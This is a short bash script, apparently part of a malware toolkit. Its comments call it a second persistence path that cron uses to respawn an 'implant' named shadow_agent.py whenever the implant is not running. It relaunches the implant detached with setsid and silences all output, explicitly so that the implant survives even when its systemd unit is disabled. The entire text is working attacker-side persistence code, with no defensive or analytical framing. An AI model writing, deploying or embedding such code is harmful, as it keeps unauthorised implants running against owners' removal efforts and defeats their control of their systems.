#!/bin/bash
# Second persistence path: cron respawns the implant if it is not running.
# Disabling the systemd unit alone does not stop the implant — this does.
set -u

if ! pgrep -f 'shadow_agent[.]py' >/dev/null 2>&1; then
  setsid /usr/bin/python3 /usr/local/sbin/shadow_agent.py >/dev/null 2>&1 &
fi
